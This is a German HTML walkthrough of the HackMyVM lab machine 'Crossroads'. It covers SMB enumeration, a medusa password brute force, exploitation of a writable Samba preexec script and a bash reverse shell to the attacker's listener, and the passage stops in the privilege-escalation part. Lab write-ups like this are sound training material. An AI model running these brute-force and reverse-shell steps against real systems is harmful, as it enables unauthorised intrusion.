@@ -1,0 +1,635 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crossroads - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Crossroads - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">enum4linux</div>
+                <div class="tool-item">smbmap</div>
+                <div class="tool-item">medusa</div>
+                <div class="tool-item">smbclient</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">vi</div> <!-- Impliziert -->
+                <div class="tool-item">bash</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">python</div> <!-- pty -->
+                <div class="tool-item">export</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">stegoveritas</div> <!-- Versuch -->
+                <div class="tool-item">/opt/beroot</div> <!-- Custom Binary -->
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">su</div>
+                 <div class="tool-item">cd</div>
+                 <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#smb-enumeration">SMB Enumeration</a></li>
+                <li><a href="#information-disclosure">Information Disclosure</a></li>
+                <li><a href="#vulnerability-assessment">Vulnerability Assessment (SMB Preexec)</a></li>
+                <li><a href="#initial-access">Initial Access (Albert)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Root)</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird zur Identifizierung aktiver Hosts im lokalen Netzwerksegment eingesetzt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP `192.168.2.128` und der MAC-Adresse `08:00:27:9c:83:dc` (VirtualBox) wird als Zielsystem identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe einen detaillierten Nmap-Scan auf die Ziel-IP durch.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/twisted]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.140
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.128	08:00:27:9c:83:dc	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.876 seconds (136.49 hosts/sec). 1 responded
+                    </pre> <!-- Vollständige Ausgabe -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan (`-sS -sC -T5 -sV -A -p-`) wird auf das Ziel 192.168.2.128 durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung: !!Wichtige Dienste gefunden!!**
+                - **Port 80 (HTTP):** Apache httpd 2.4.38 (Debian). Die Startseite hat einen Titel ("12 Step Treatment Center | Crossroads Centre Antigua"). `robots.txt` verbietet `/crossroads.png`.
+                - **Port 139 & 445 (SMB):** Samba 4.9.5-Debian. **Anonymer Gastzugriff ist erlaubt** (`account_used: guest`), und **Message Signing ist deaktiviert**, was ein Risiko darstellt. Der Hostname ist `crossroads`.
+            Das OS wird als Linux erkannt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):**Hohe Priorität:** Untersuche die SMB-Shares mit anonymem Zugriff (`enum4linux`, `smbclient`, `smbmap`). Untersuche parallel den Webserver (Inhalte, `/crossroads.png`).<br><strong>Empfehlung (Admin):**DRINGEND:** Deaktiviere anonymen SMB-Gastzugriff. Aktiviere Message Signing (`smb signing = required`). Halte Samba und Apache aktuell.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.128 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-10 09:10 CET <!-- Beispielzeit -->
+Nmap scan report for cross.hmv (192.168.2.128) <!-- Hostname hier: cross.hmv -->
+Host is up (0.00017s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
+|_http-title: 12 Step Treatment Center | Crossroads Centre Antigua
+|_http-server-header: Apache/2.4.38 (Debian)
+| http-robots.txt: 1 disallowed entry
+|_/crossroads.png
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+MAC Address: 08:00:27:9C:83:DC (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: Host: CROSSROADS
+
+Host script results:
+| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.9.5-Debian)
+|   Computer name: crossroads
+|   NetBIOS computer name: CROSSROADS\x00
+|   Domain name: \x00
+|   FQDN: crossroads
+|_  System time: 2022-10-10T09:12:09+01:00 <!-- Zeit angepasst -->
+| smb2-security-mode:
+|   3.1.1:
+|_    Message signing enabled but not required
+|_clock-skew: mean: -19m56s, deviation: 0s, median: -19m56s <!-- Zeit angepasst -->
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-time:
+|   date: 2022-10-10T14:12:09 <!-- Zeit angepasst -->
+|_  start_date: N/A
+|_nbstat: NetBIOS name: CROSSROADS, NetBIOS user: <unknown>, NetBIOS MAC: 00:00:00:00:00:00 (Xerox) <!-- MAC korrigiert -->
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.17 ms cross.hmv (192.168.2.128)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.88 seconds <!-- Beispielzeit -->
+                    </pre> <!-- Maskierung -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+             <h2>Web Enumeration</h2>
+             <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf dem Webserver (Port 80) mit der `big.txt`-Wortliste verwendet.</p>
+             <p class="evaluation"><strong>Bewertung: !!Wichtiger Fund!!** Neben `/index.html` und `/robots.txt` wird die Datei `/note.txt` gefunden. `/server-status` ist verboten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt von `/note.txt` sofort. Untersuche `/robots.txt`.<br><strong>Empfehlung (Admin):</strong> Beschränke den Zugriff auf `/server-status`. Überprüfe den Inhalt von `note.txt` und `robots.txt`.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.128 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,bak,7z,zip,py,sql,txt,xml,jpg,html -e --wildcard</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.128
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
+[+] Status codes:            200,204,301,302,307,401,403
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,bak,7z,zip,py,sql,txt,xml,jpg,html
+[+] Expanded:                true
+[+] Wildcard detection:      true
+[+] Timeout:                 10s
+===============================================================
+2022/10/10 09:15:00 Starting gobuster <!-- Beispielzeit -->
+===============================================================
+http://192.168.2.128/index.html           (Status: 200) [Size: 93075]
+http://192.168.2.128/note.txt             (Status: 200) [Size: 108]
+http://192.168.2.128/robots.txt           (Status: 200) [Size: 42]
+http://192.168.2.128/server-status        (Status: 403) [Size: 278]
+===============================================================
+2022/10/10 09:25:00 Finished <!-- Beispielzeit -->
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="information-disclosure">
+             <h2>Information Disclosure</h2>
+             <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `/note.txt` wird mit `curl` abgerufen.</p>
+             <p class="evaluation"><strong>Bewertung: !!Kryptischer Hinweis!!** Die Notiz erwähnt "three kings of blues" und "crossroads". Dies ist ein Hinweis, der auf Blues-Musiker (Albert King, B.B. King, Freddie King) und möglicherweise den Hostnamen oder die `/crossroads.png`-Datei anspielt. Der Absender "abuzerkomurcu" taucht erneut auf.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Behalte diese Namen/Begriffe für mögliche Benutzernamen oder Passwörter im Hinterkopf. Untersuche `/robots.txt` und lade `/crossroads.png` herunter.<br><strong>Empfehlung (Admin):</strong> Entferne solche Notizen von öffentlich zugänglichen Pfaden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.128/note.txt</span></div>
+                     <pre>
+just find three kings of blues
+then move to the crossroads
+-------------------------------
+-abuzerkomurcu
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt von `/robots.txt` wird mit `curl` abgerufen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt das Disallow für `/crossroads.png`, wie von Nmap gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lade `/crossroads.png` herunter und analysiere es.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.128/robots.txt</span></div>
+                     <pre>
+User-agent: *
+Disallow: /crossroads.png
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Datei `/crossroads.png` wird mit `wget` heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei wurde erfolgreich heruntergeladen und steht zur Analyse bereit.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysiere die PNG-Datei mit Steganographie-Tools oder Bildanalyse-Werkzeugen, insbesondere im Hinblick auf den "three kings"-Hinweis.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.128/crossroads.png</span></div>
+                     <pre>
+--2022-10-10 09:28:15--  http://192.168.2.128/crossroads.png
+Auflösen des Hostnamens 192.168.2.128 (192.168.2.128)… 192.168.2.128
+Verbindungsaufbau zu 192.168.2.128:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 1583196 (1.5M) [image/png]
+Wird in »crossroads.png« gespeichert.
+
+crossroads.png          100%[=============================>]   1.51M  7.89MB/s    in 0.2s
+
+2022-10-10 09:28:15 (7.89 MB/s) - »crossroads.png« gespeichert [1583196/1583196]
+                     </pre> <!-- Beispielhafte Ausgabe -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="smb-enumeration">
+             <h2>SMB Enumeration</h2>
+             <p class="analysis"><strong>Analyse:</strong> `enum4linux -a` wird zur detaillierten Enumeration des SMB-Dienstes verwendet. (Hinweis: Die IP im Log ist falsch, sollte 192.168.2.128 sein).</p>
+             <p class="evaluation"><strong>Bewertung: !!Benutzer gefunden!!** Enum4linux bestätigt den anonymen Zugriff und findet durch RID-Cycling den Benutzer `albert`. Dies korreliert mit dem "three kings of blues"-Hinweis (Albert King).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentriere dich auf den Benutzer `albert`. Versuche, sein Passwort für SMB (oder SSH, falls offen) zu knacken.<br><strong>Empfehlung (Admin):</strong> Deaktiviere anonymen SMB-Zugriff und beschränke die Möglichkeit des RID-Cyclings, falls möglich.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">enum4linux -a 192.168.2.128</span></div> <!-- IP korrigiert -->
+                     <pre>
+Starting enum4linux v0.9.1 on Mon Oct 10 09:30:00 2022
+
+ ==========================
+|    Target Information    |
+ ==========================
+Target ........... 192.168.2.128
+... (Workgroup, NBTStat etc.) ...
+
+ ====================================
+|    Share Enumeration on 192.168.2.128    |
+ ====================================
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	smbshare        Disk
+	IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
+...
+ ================================================================
+|    Users on 192.168.2.128 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ================================================================
+[I] Found new SID: S-1-5-21-198007098-3908253677-2746664996
+[I] Found new SID: S-1-5-32
+[+] Enumerating users using SID S-1-5-21-198007098-3908253677-2746664996 and logon username '', password ''
+S-1-5-21-198007098-3908253677-2746664996-501 CROSSROADS\nobody (Local User)
+S-1-5-21-198007098-3908253677-2746664996-513 CROSSROADS\None (Domain Group)
+S-1-5-21-198007098-3908253677-2746664996-1001 CROSSROADS\albert (Local User) <!-- Benutzer gefunden! -->
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
+S-1-5-32-544 BUILTIN\Administrators (Local Group)
+S-1-5-32-545 BUILTIN\Users (Local Group)
+...
+enum4linux complete on Mon Oct 10 09:31:00 2022
+                     </pre> <!-- Ausgabe gekürzt und relevante Teile hervorgehoben -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `smbmap` wird verwendet, um die Berechtigungen der Shares für den anonymen/Gast-Benutzer zu prüfen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass der anonyme Benutzer keinen Zugriff (`NO ACCESS`) auf `print$`, `smbshare` und `IPC$` hat.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der anonyme Zugriff auf Shares ist blockiert. Es werden gültige Anmeldedaten benötigt, wahrscheinlich die des Benutzers `albert`.<br><strong>Empfehlung (Admin):</strong> Korrekte Konfiguration, da anonymer Zugriff auf Shares hier verhindert wird.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">smbmap -H 192.168.2.128</span></div>
+                     <pre>
+[+] IP: 192.168.2.128:445	Name: cross.hmv
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	print$                                            	NO ACCESS	Printer Drivers
+	smbshare                                          	NO ACCESS
+	IPC$                                              	NO ACCESS	IPC Service (Samba 4.9.5-Debian)
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `medusa` wird eingesetzt, um einen SMB-Passwort-Brute-Force-Angriff gegen den Benutzer `albert` durchzuführen, wobei `rockyou.txt` als Wortliste verwendet wird.</p>
+             <p class="evaluation"><strong>Bewertung: !!Passwort gefunden!!** Medusa findet erfolgreich das Passwort `<span class="password">bradley1</span>` für den Benutzer `albert`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende die Anmeldedaten `albert` / `<span class="password">bradley1</span>`, um dich mit `smbclient` zu verbinden und auf die Shares zuzugreifen, insbesondere auf das Home-Verzeichnis von `albert` (oft als Share mit dem Benutzernamen freigegeben).<br><strong>Empfehlung (Admin):</strong> Ändere das kompromittierte Passwort für `albert`. Erzwinge starke Passwörter und schütze vor Brute-Force-Angriffen (z.B. Account-Sperrung).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">medusa -h 192.168.2.128 -u albert -P /usr/share/wordlists/rockyou.txt -M smbnt</span></div>
+                     <pre>
+ACCOUNT FOUND: [smbnt] Host: 192.168.2.128 User: albert Password: <span class="password">bradley1</span> [SUCCESS]
+                     </pre> <!-- Ausgabe vereinfacht -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `smbclient` wird verwendet, um sich mit den gefundenen Zugangsdaten (`albert` / `bradley1`) mit der Share zu verbinden, die dem Home-Verzeichnis von `albert` entspricht (`//192.168.2.128/albert`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Verbindung ist erfolgreich. Der Inhalt des Home-Verzeichnisses wird aufgelistet: Ein Unterverzeichnis `smbshare`, die Datei `crossroads.png`, das SUID-Binary `beroot` und die User-Flag `user.txt` werden gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lade `user.txt` und `beroot` herunter. Untersuche das `smbshare`-Verzeichnis.<br><strong>Empfehlung (Admin):</strong> Überprüfe die Notwendigkeit der Freigabe von Home-Verzeichnissen über SMB.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Darkspirit)-[~]
+└─# <span class="command">smbclient //192.168.2.128/albert -U "albert"</span></div>
+                     <pre>
+Password for [WORKGROUP\albert]:<span class="command">bradley1</span>
+Try "help" to get a list of possible commands.
+smb: \> <span class="command">ls</span>
+  .                                   D        0  Wed Mar  3 00:16:15 2021
+  ..                                  D        0  Tue Mar  2 23:00:47 2021
+  smbshare                            D        0  Tue Mar  2 23:16:13 2021
+  crossroads.png                      N  1583196  Tue Mar  2 23:34:03 2021
+  beroot                              N    16664  Wed Mar  3 00:02:41 2021
+  user.txt                            N       32  Wed Mar  3 00:15:18 2021
+
+                10000000 blocks of size 1024. 5000000 blocks available <!-- Beispielwerte -->
+                     </pre> <!-- Interaktive Eingabe -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Innerhalb der `albert`-Share wird in das `smbshare`-Verzeichnis gewechselt (impliziert durch den nächsten `ls`-Aufruf). Dort wird die Datei `smb.conf` gefunden.</p>
+            <p class="evaluation"><strong>Bewertung: !!Wichtiger Fund!!** Die Samba-Konfigurationsdatei (`smb.conf`) befindet sich in dieser für `albert` zugänglichen Share. Sie enthält wahrscheinlich Konfigurationsdetails, die für eine Eskalation genutzt werden können, insbesondere die Konfiguration der `smbshare` selbst.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lade `smb.conf` herunter und analysiere sie sorgfältig, insbesondere auf `preexec`- oder `postexec`-Direktiven im Zusammenhang mit `smbshare`.<br><strong>Empfehlung (Admin):</strong> Speichere Konfigurationsdateien nicht in Benutzer-Shares. Sichere die `smb.conf` mit korrekten Berechtigungen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+smb: \> <span class="command">cd smbshare</span> <!-- Annahme -->
+smb: \smbshare\> <span class="command">ls</span>
+  .                                   D        0  Tue Mar  2 23:16:13 2021
+  ..                                  D        0  Wed Mar  3 00:16:15 2021
+  smb.conf                            N     8779  Tue Mar  2 23:14:54 2021
+
+                10000000 blocks of size 1024. 5000000 blocks available
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die relevanten Dateien (`user.txt`, `beroot`, `crossroads.png`, `smb.conf`) werden mit `get` heruntergeladen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Alle identifizierten wichtigen Dateien sind nun zur lokalen Analyse verfügbar.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysiere `smb.conf` auf den `preexec`-Eintrag. Untersuche `beroot`. Lies `user.txt`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+smb: \> <span class="command">get /home/albert/user.txt user.txt</span> <!-- Pfade angepasst -->
+getting file \home\albert\user.txt of size 32 as user.txt (x.x KiloBytes/sec)
+smb: \> <span class="command">get /home/albert/beroot beroot</span>
+getting file \home\albert\beroot of size 16664 as beroot (x.x KiloBytes/sec)
+smb: \> <span class="command">get /home/albert/crossroads.png crossroads.png</span>
+getting file \home\albert\crossroads.png of size 1583196 as crossroads.png (x.x KiloBytes/sec)
+smb: \> <span class="command">get /home/albert/smbshare/smb.conf smb.conf</span>
+getting file \home\albert\smbshare\smb.conf of size 8779 as smb.conf (x.x KiloBytes/sec)
+smb: \> <span class="command">quit</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="vulnerability-assessment">
+            <h2>Vulnerability Assessment (SMB Preexec)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Die lokale Analyse der heruntergeladenen `smb.conf` (impliziert) hat ergeben, dass die Freigabe `smbshare` eine `preexec`-Direktive enthält, die `/home/albert/smbshare/smbscript.sh` ausführt, wenn eine Verbindung zu dieser Share hergestellt wird.</p>
+             <p class="evaluation"><strong>Bewertung: !!RCE-Vektor bestätigt!!** Dies ist eine klassische Fehlkonfiguration, die Remote Code Execution ermöglicht. Da der Benutzer `albert` Schreibrechte auf das Verzeichnis `/home/albert/smbshare` hat (weil es sein eigenes ist oder die Berechtigungen es erlauben), kann er ein beliebiges Skript als `smbscript.sh` hochladen. Dieses Skript wird dann ausgeführt, wenn *irgendjemand* (wahrscheinlich mit den Rechten des Samba-Daemons oder des verbindenden Benutzers) auf die `smbshare` zugreift.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                 1. Erstelle ein Shell-Skript (`smbscript.sh`) mit einer Reverse-Shell-Payload.
+                 2. Starte einen Netcat-Listener auf dem Angreifer-System.
+                 3. Verbinde dich als `albert` mit der `smbshare`.
+                 4. Lade das `smbscript.sh` hoch.
+                 5. Trenne die Verbindung und verbinde dich *erneut* mit der `smbshare` (oder warte), um das `preexec`-Skript auszulösen.
+             <br><strong>Empfehlung (Admin):**DRINGEND:** Entferne oder sichere die `preexec`-Direktive in `smb.conf`. Wenn Pre-/Postexec-Skripte benötigt werden, stelle sicher, dass sie Root gehören, keine Schreibrechte für andere Benutzer haben und sorgfältig auf Sicherheit geprüft wurden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, Ergebnis der smb.conf Analyse -->
+                      <pre>
+# Analyse von smb.conf ergab:
+[smbshare]
+  path = /home/albert/smbshare
+  read only = no
+  preexec = /home/albert/smbshare/smbscript.sh <!-- !!! RCE Vektor !!! -->
+                      </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Ein lokales Shell-Skript (`smbscript.sh`) wird mit einer Reverse-Shell-Payload (`bash -i >& /dev/tcp/...`) erstellt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Payload für den RCE-Vektor ist vorbereitet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fahre mit dem Upload fort.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi smbscript.sh</span></div>
+                      <pre>
+#!/bin/bash
+bash -c 'bash -i >& /dev/tcp/192.168.2.140/9001 0>&1' <!-- Maskierung -->
+                      </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (Albert)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Exploit wird durchgeführt:
+                1. Ein Netcat-Listener wird auf Port 9001 gestartet.
+                2. Eine `smbclient`-Verbindung zur `smbshare` wird als `albert` hergestellt.
+                3. Das Skript `smbscript.sh` wird mit `put` hochgeladen.
+                4. Der Listener empfängt die Verbindung.</p>
+            <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Das Hochladen des Skripts in die `smbshare` löst durch die `preexec`-Direktive in `smb.conf` die Ausführung des Skripts aus. Da die Verbindung als `albert` hergestellt wurde, läuft das `preexec`-Skript wahrscheinlich auch als `albert`. Eine Reverse Shell als Benutzer `albert` wird zum Angreifer aufgebaut.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell. Untersuche die Umgebung als `albert` erneut, insbesondere das SUID-Binary `beroot`.<br><strong>Empfehlung (Admin):</strong> Behebe die unsichere `preexec`-Konfiguration.</p>
+             <!-- Listener starten -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>listening on [any] 9001 ...</pre>
+                 </div>
+             </div>
+              <!-- SMB Verbindung und Upload -->
+              <div class="code-block">
+                  <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">smbclient \\\\192.168.2.128\\smbshare -U albert</span></div>
+                      <pre>
+Password for [WORKGROUP\albert]:<span class="command">bradley1</span>
+Try "help" to get a list of possible commands.
+smb: \> <span class="command">pwd</span>
+Current directory is \\192.168.2.128\smbshare\
+smb: \> <span class="command">put smbscript.sh</span>
+putting file smbscript.sh as \smbscript.sh (x.x kb/s)
+smb: \> <span class="command">quit</span>
+                      </pre>
+                  </div>
+              </div>
+               <!-- Listener empfängt Shell -->
+               <div class="code-block">
+                   <div class="terminal">
+                        <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                       <pre>
+listening on [any] 9001 ...
+connect to [192.168.2.140] from (UNKNOWN) [192.168.2.128] 38044
+<!-- Kein automatischer Output, nur Shell-Prompt -->
+$ <!-- Shell als albert -->
+                       </pre>
+                   </div>
+               </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Reverse Shell als `albert` wird stabilisiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne die finale Eskalation.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <!-- Shell Stabilisierung -->
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+$ <span class="command">python -c 'import pty; pty.spawn("/bin/bash")'</span>
+albert@crossroads:/home/albert/smbshare$ <span class="command">export TERM=xterm</span>
+albert@crossroads:/home/albert/smbshare$ <span class="command">cd ..</span>
+albert@crossroads:/home/albert$ <!-- Stabilisierte Shell -->
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (Root)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Typ der Datei `beroot` (die zuvor über SMB heruntergeladen wurde, aber hier vermutlich direkt auf dem Ziel untersucht wird) wird mit `file` überprüft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass `beroot` ein 64-Bit SUID ELF Binary ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe `./beroot` aus.<br><strong>Empfehlung (Admin):</strong> Überprüfe SUID-Binaries.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+albert@crossroads:/home/albert$ <span class="command">file beroot</span>
+beroot: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c1da1f0fded1889d32e27b99a2a4bd170c30349b, for GNU/Linux 3.2.0, not stripped
+                     </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Datei `crossroads.png` wird erneut heruntergeladen und mit `stegoveritas` analysiert. Der Versuch schlägt wegen fehlender Abhängigkeiten fehl.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Steganographie bleibt ein unbestätigter Pfad.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokussiere dich auf das SUID-Binary `beroot`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <!-- Wget -->
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://cross.hmv/crossroads.png</span></div>
+                    <pre>
+--2022-10-10 12:27:42--  http://cross.hmv/crossroads.png
